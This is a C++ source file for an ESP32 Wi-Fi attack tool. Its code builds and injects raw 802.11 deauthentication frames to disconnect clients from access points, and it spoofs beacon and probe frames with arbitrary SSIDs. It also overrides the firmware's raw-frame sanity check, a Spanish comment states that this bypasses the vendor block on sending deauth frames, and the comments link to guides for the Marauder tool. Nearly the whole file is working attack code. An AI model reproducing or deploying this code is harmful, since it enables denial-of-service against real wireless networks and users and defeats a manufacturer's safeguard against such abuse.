#include "PacketSender.h"

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int32_t size);

/*// BYPASS DE QUE NO SE PUEDEN ENVIAR DEAUTH
//https://www.reddit.com/r/WillStunForFood/comments/ot8vzl/finally_got_the_esp32_to_send_deauthentication/
//https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup#if-you-are-following-these-instructions-you-do-not-need-to-do-this
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}*/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}

bool PacketSender::checkIfBypassed(){
    if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
        return true;
    else
        return false;
}

void PacketSender::deauth_bypassed(const MacAddr ap, const MacAddr station, const MacAddr bssid, uint8_t reason, uint8_t channel) {
    
    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[4], ap, 6);
    memcpy(&buffer[10], station, 6);
    memcpy(&buffer[16], bssid, 6);
    memcpy(&buffer[22], &seqnum, 2);
    buffer[24] = reason;

    seqnum++;

    wsl_bypasser_send_raw_frame(buffer, sizeof(deauthPacket));
}


void PacketSender::beacon_bypassed(const MacAddr mac, const char* ssid, uint8_t channel, bool wpa2) {
    //esp_err_t res = change_channel(channel);
    //if(res != ESP_OK) return res;

    int packetSize = sizeof(beaconPacket);
    int ssidLen = strlen(ssid);
    memcpy(buffer, beaconPacket, sizeof(beaconPacket));
    memcpy(&buffer[10], mac, 6);    
    memcpy(&buffer[16], mac, 6);
    memcpy(&buffer[22], &seqnum, 2);
    memcpy(&buffer[38], ssid, ssidLen);

    if (wpa2) {
        buffer[34] = 0x31;
    } else {
        buffer[34] = 0x21;
        packetSize -= 26;
    }
    buffer[82] = channel;

    buffer[37] = ssidLen;
    memcpy(&buffer[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);

    seqnum++;
    wsl_bypasser_send_raw_frame(buffer, packetSize);
}


esp_err_t PacketSender::deauth(const MacAddr ap, const MacAddr station, const MacAddr bssid, uint8_t reason, uint8_t channel) {
    
    
    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[4], ap, 6);
    memcpy(&buffer[10], station, 6);
    memcpy(&buffer[16], bssid, 6);
    memcpy(&buffer[22], &seqnum, 2);
    buffer[24] = reason;

    seqnum++;

    //buffer[0] = 0x80;
    esp_err_t res = raw(buffer, sizeof(deauthPacket), false, false);
    if(res == ESP_OK)
      return ESP_OK;
    
    buffer[0] = 0xa0;
    return raw(buffer, sizeof(deauthPacket), false, false);
}

esp_err_t PacketSender::beacon(const MacAddr mac, const char* ssid, uint8_t channel, bool wpa2) {
    //esp_err_t res = change_channel(channel);
    //if(res != ESP_OK) return res;

    int packetSize = sizeof(beaconPacket);
    int ssidLen = strlen(ssid);
    memcpy(buffer, beaconPacket, sizeof(beaconPacket));
    memcpy(&buffer[10], mac, 6);    
    memcpy(&buffer[16], mac, 6);
    memcpy(&buffer[22], &seqnum, 2);
    memcpy(&buffer[38], ssid, ssidLen);

    if (wpa2) {
        buffer[34] = 0x31;
    } else {
        buffer[34] = 0x21;
        packetSize -= 26;
    }
    buffer[82] = channel;

    buffer[37] = ssidLen;
    memcpy(&buffer[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);

    seqnum++;
    return raw(buffer, packetSize);
}

esp_err_t PacketSender::probe(const MacAddr mac, const char* ssid, uint8_t channel) {

    //esp_err_t res = change_channel(channel);
    //if(res != ESP_OK) return res;

    memcpy(buffer, probePacket, sizeof(probePacket));
    memcpy(&buffer[10], mac, 6);
    memcpy(&buffer[26], ssid, strlen(ssid));

    return raw(buffer, sizeof(probePacket));
}

esp_err_t PacketSender::raw(const uint8_t* packet, int32_t len, bool en_sys_seq, bool interface_ap) {
    for(unsigned int i = 0; i < len; i++){
    	if(packet[i] < 16){
        Serial.print("0");
    	}
    	Serial.print(packet[i], HEX);
    }
    Serial.println();
    if(interface_ap){
      return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
    } else {
      return esp_wifi_80211_tx(WIFI_IF_STA, packet, len, en_sys_seq);  
    }
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int32_t size){
    for(unsigned int i = 0; i < size; i++){
        if(frame_buffer[i] < 16){
            Serial.print("0");
        }
        Serial.print(frame_buffer[i], HEX);
    }
    Serial.println();
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

//esp_err_t PacketSender::change_channel(uint8_t channel) {
//    return esp32_deauther_configure_wifi(channel);
//}